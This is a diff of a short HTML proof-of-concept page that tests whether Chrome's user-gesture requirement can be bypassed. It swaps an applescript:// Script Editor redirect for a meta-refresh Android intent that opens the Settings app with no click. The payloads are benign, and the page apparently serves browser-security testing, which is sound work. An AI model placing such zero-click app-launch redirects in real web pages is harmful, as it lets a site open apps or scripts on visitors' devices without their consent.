@@ -1,14 +1,13 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>Settings Auto Launch PoC</title>
+  <!-- Zero-click launch using intent -->
+  <meta http-equiv="refresh"
+        content="0;url=intent://#Intent;action=android.settings.SETTINGS;end">
+</head>
 <body>
-<script>
-// Attempt immediate redirect to app schemes
-window.location.href = 'applescript://com.apple.scripteditor?action=new&script=display%20dialog%20%22JavaScript%20Redirect%22';
-</script>
-
-<!-- Fallback if JS blocked -->
-<noscript>
-    <meta http-equiv="refresh" content="0;url=applescript://com.apple.scripteditor?action=new&script=display%20dialog%20%22NoScript%20Fallback%22">
-</noscript>
+  <h1>Settings Auto Launch PoC</h1>
+  <p>If the Settings app opens automatically without interaction, Chrome user-gesture enforcement is bypassed.</p>
 </body>
 </html>
